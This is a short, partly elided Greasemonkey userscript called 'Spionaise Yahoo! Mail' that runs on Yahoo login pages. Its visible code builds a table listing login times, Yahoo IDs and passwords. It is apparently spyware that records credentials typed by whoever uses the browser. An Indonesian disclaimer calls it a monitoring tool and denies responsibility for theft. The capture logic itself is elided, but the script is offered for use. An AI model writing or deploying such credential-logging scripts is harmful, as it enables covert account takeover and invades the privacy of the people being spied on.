// ==UserScript==
// @name           Spionaise Yahoo! Mail
// @version 		1.3
// @namespace      http://userscripts.org/users/ruifujiwara
// @description    Spionaise Email Yahoo
// @include        https://login.yahoo*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	APLIKASI INI DIBUAT UNTUK MENGAWASI BUKAN UNTUK MENGUASAI AKUN YAHOO MAIL SESEORANG DAN APABILA TERJADI HAL-HAL YANG MENJADIKAN KERUGIAN PADA PIHAK TERTENTU SAYA SEBAGAI PEMBUAT APLIKASI INI TIDAK BERTANGGUNG JAWAB KARENA SAYA SELAKU PRODUSEN TIDAK MEMBENARKAN TINDAKAN PENCURIAN UNTUK MOTIF KEJAHATAN
.
// ==/UserScript==

var title 				= "Spionaise Yahoo! mail";
var version 			= "v1.3";
...
function display()
{
	...
	html += '<table cellspacing="0"><thead class="unselectable"><tr><th>Waktu Masuk</th><th>ID Yahoo!</th><th>Password</th><th>Masuk</th></tr></thead>';
	html += '<tbody>';
